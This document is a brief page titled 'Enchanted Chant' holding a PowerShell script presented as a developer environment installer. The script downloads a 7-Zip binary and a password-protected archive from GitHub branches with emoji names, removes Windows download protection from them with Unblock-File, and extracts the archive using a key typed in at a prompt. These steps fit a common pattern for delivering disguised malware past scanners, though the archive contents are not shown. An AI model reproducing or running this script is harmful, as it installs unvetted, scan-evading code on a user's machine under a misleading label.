# Enchanted Chant

```PowerShell
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$InstallDirPath = "C:\TempInstall\InstallScript"
$SevenZipExeFilePath = "$InstallDirPath\Lib\7z.exe"
$SevenZipDllFilePath = "$InstallDirPath\Lib\7z.dll"
$ArtifactArchiveFilePath = "$InstallDirPath\init-dev-env.7z"
$Pswd = Read-Host -Prompt "Key?"
New-Item -ItemType Directory -Path "$InstallDirPath\Lib" -Force -ErrorAction SilentlyContinue | Out-Null
Invoke-WebRequest -Uri https://raw.githubusercontent.com/init-dev-env/init-dev-env-act/refs/heads/🍆🐮🐭Obsolete-68D5/lib/7z.exe -OutFile "$SevenZipExeFilePath" -ErrorAction Stop | Out-Null
Invoke-WebRequest -Uri https://raw.githubusercontent.com/init-dev-env/init-dev-env-act/refs/heads/🍆🐮🐭Obsolete-68D5/lib/7z.dll -OutFile "$SevenZipDllFilePath" -ErrorAction Stop | Out-Null
Unblock-File "$SevenZipExeFilePath" | Out-Null
Unblock-File "$SevenZipDllFilePath" | Out-Null
Invoke-WebRequest https://github.com/init-dev-env/init-dev-env/releases/download/🍆🐮🐭Obsolete-68D5/init-dev-env.7z -OutFile "$ArtifactArchiveFilePath" -ErrorAction Stop | Out-Null
Unblock-File "$ArtifactArchiveFilePath" | Out-Null
Start-Process "$SevenZipExeFilePath" -ArgumentList "x `"$ArtifactArchiveFilePath`" -o`"$InstallDirPath`" -p$Pswd -x!Lib\7z.exe -x!Lib\7z.dll -y -sccWIN -scsUTF-8 -bso0 -bsp0 -bd" -Wait -NoNewWindow | Out-Null
Start-Process "C:\Windows\Explorer.exe" -ArgumentList "$InstallDirPath"

```

